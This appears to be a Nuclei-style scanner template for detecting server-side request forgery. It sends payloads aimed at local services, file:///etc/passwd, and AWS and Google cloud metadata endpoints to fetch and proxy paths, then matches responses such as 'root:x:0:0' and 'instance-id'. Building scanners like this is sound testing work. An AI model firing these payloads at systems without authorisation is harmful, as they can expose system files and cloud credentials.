id: aegis-advanced-ssrf
info:
  author: AEGIS-X
  classification:
    cwe-id: CWE-918
    owasp: A10:2021
  description: Advanced SSRF detection with multiple payloads
  name: Advanced SSRF Detection
  severity: high
requests:
- body: url={{payload}}
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - condition: or
    type: word
    words:
    - SSH-2.0
    - root:x:0:0
    - ami-id
    - instance-id
    - MySQL
    - Connection refused
    - metadata
  method: POST
  path:
  - '{{BaseURL}}/ssrf/fetch'
  - '{{BaseURL}}/fetch'
  - '{{BaseURL}}/proxy'
  - '{{BaseURL}}/webhook'
  payloads:
    payload:
    - http://127.0.0.1:22
    - http://localhost:3306
    - http://169.254.169.254/latest/meta-data/
    - file:///etc/passwd
    - http://0.0.0.0:80
    - http://[::1]:22
    - gopher://127.0.0.1:3306
    - dict://127.0.0.1:11211
    - http://metadata.google.internal/
    - http://169.254.169.254/computeMetadata/v1/
